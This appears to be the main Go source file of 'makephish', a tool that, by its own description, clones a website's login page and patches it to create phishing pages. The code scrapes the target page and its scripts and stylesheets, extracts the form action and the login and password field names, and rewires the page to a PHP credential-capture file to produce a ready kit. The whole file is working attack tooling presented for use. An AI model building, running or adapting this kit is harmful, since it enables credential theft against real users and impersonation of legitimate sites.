/*
- MAKEPHISH -
Automatically clone and patch simple websites to create phishing pages
*/

package main

import (
	"flag"
	"fmt"
	"github.com/gocolly/colly"
	"net/url"
	"os"
	"path"
)

var (
	destFolder  string
	urlin       string
	agent       string
	phpFilename string
	asciiart string =
`
           _           _   _     _
 _____  __| |_ ___ ___| |_|_|___| |_
|     ||. | '_| -_| . |   | |_ -|   |
|_|_|_|___|_|_|___|  _|_|_|_|___|_|_|
                  |_|
`


)

/* getFormPost(url string) (string, string, string): check if there is a post with an action in the url specified and returns:
- path of the action of the form
- name of the attribute for the login
- name of the attribute for the password */
func getFormPost(urlin string) (string, string, string) {

	c := colly.NewCollector(colly.UserAgent(agent))
	postPath := ""
	postLogin := ""
	postPassword := ""

	// check every form in the HTML
	c.OnHTML("form[method=post]", func(e *colly.HTMLElement) {
		postPath = e.Attr("action")

		// find name of the input tag for the email/login
		e.ForEach("input[type=text]:not([hidden=hidden])", func(_ int, login *colly.HTMLElement) {
			postLogin = login.Attr("name")
		})

		// find name of the input tag for the password
		e.ForEach("input[type=password]", func(_ int, password *colly.HTMLElement) {
			postPassword = password.Attr("name")
		})
	})

	c.Visit(urlin)

	return postPath, postLogin, postPassword
}

func main() {

	// parse flag and cli inputs
	flag.StringVar(&urlin, "url", "", "URL of login page")
	flag.StringVar(&agent, "ua", "Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0", "User Agent string")
	flag.StringVar(&phpFilename, "php", "phish.php", "Path to the PHP file to be used")
	flag.StringVar(&destFolder, "kits", "kits", "Path used to store the kits")

	flag.Parse()

	// check if url was provided
	if urlin == "" {
		fmt.Fprintf(os.Stderr, "\nEmpty URL, please specify a URL using the -u flag.\n")
		os.Exit(1)

		// remove / from end of url
	} else if string(urlin[len(urlin)-1]) == "/" {
		urlin = urlin[0 : len(urlin)-1]
	}

	fmt.Println(asciiart)
	// Instantiate default collector
	c := colly.NewCollector(colly.UserAgent(agent))

	// get parameters of the form in the HTML
	fmt.Printf("\nNavigating to %s using the following User agent: %s \n", urlin, agent)
	postPath, postLogin, postPassword := getFormPost(urlin)

	if postPath == "" || postLogin == "" || postPassword == "" {
		fmt.Fprintf(os.Stderr, "No compatible form found in the given URL!\n")
		os.Exit(1)
	} else {
		fmt.Printf("Parameters found in the form of the given URL:\n - post action = %s\n - login attribute name = %s\n - password attribute name = %s\n", postPath, postLogin, postPassword)
	}

	// If given URL does not have a form with a POST: print error
	var remotePaths []string
	var localPaths []string

	// parse given URL to create destination folder for downloaded files
	p, err := url.Parse(urlin)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error parsing the path of the destination folder: %s\n", err)
		os.Exit(1)
	}

	// prepare folder for saving files
	destFolder = destFolder + "/" + p.Host
	urlinPath := p.Path

	// create destination folder
	if err = mkdirIfNotExist(destFolder); err != nil {
		fmt.Fprintf(os.Stderr, "Error while creting the destination folder: %s\n", err)
		os.Exit(1)
	}

	// Colly callback functions:
	// OnResponse -> download file in a specific directory
	c.OnResponse(func(resp *colly.Response) {

		pathfile := resp.Request.URL.RequestURI()

		// parse link to get the path of the file
		p, err := url.Parse(resp.Request.URL.String())
		if err != nil {
			fmt.Fprintf(os.Stderr, ": Error while parsing link of a file: %s\n", err)
			os.Exit(1)
		}

		// create folder to store the files
		fold := path.Dir(p.EscapedPath())
		filename := path.Base(p.EscapedPath())
		if fold != "" {
			if err := mkdirIfNotExist(destFolder + "/" + fold); err != nil {
				fmt.Fprintf(os.Stderr, ": Error while creating the directory to save files: %s\n", err)
				os.Exit(1)
			}
		}

		// check if it is main html page
		if urlinPath == pathfile {
			filename = "index.html"
		} else {
			localPaths = append(localPaths, fold+"/"+filename)
		}

		// save file in appropriate directory
		if err = resp.Save(destFolder + fold + "/" + filename); err != nil {
			fmt.Fprintf(os.Stderr, "Error while saving file in the appropriate directory: %s\n", err)
			os.Exit(1)
		}
	})

	// On every script tag found linked in the HTML -> visit and download
	c.OnHTML("script", func(e *colly.HTMLElement) {
		link := e.Attr("src")
		if link != "" {
			remotePaths = append(remotePaths, link)
			c.Visit(e.Request.AbsoluteURL(link))
		}
	})

	// On every css file found linked in the HTML -> visit and download
	c.OnHTML("link[rel=stylesheet]", func(e *colly.HTMLElement) {
		link := e.Attr("href")
		if link != "" {
			remotePaths = append(remotePaths, link)
			c.Visit(e.Request.AbsoluteURL(link))
		}
	})

	// Start scraping
	c.Visit(urlin)

	// save and patch the HTML file to make it compatible with the PHP
	if err := patchHtml(destFolder, remotePaths, localPaths, postPath, phpFilename); err != nil {
		fmt.Fprintf(os.Stderr, "Error while patching the HTML: %s\n", err)
		os.Exit(1)
	} else {
		fmt.Printf("HTML file patched and saved in %s\n", destFolder)
	}

	// copy PHP file in the dest folder
	if err := copyPhpToKit(phpFilename, destFolder); err != nil {
		fmt.Fprintf(os.Stderr, "Error while copying the PHP file in the destination folder: %s\n", err)
		os.Exit(1)
	} else {
		fmt.Printf("PHP file saved in %s\n", destFolder)
	}

	// patch the PHP file in order to make the kit work
	if err := patchPhp(destFolder+"/"+phpFilename, postLogin, postPassword, urlin); err != nil {
		fmt.Fprintf(os.Stderr, "Error while patching the PHP file: %s\n", err)
		os.Exit(1)

		// IT WORKED!
	} else {
		fmt.Printf("\n[*] operation completed! kit created for %s and saved in %s\n\n", urlin, destFolder)
	}
}
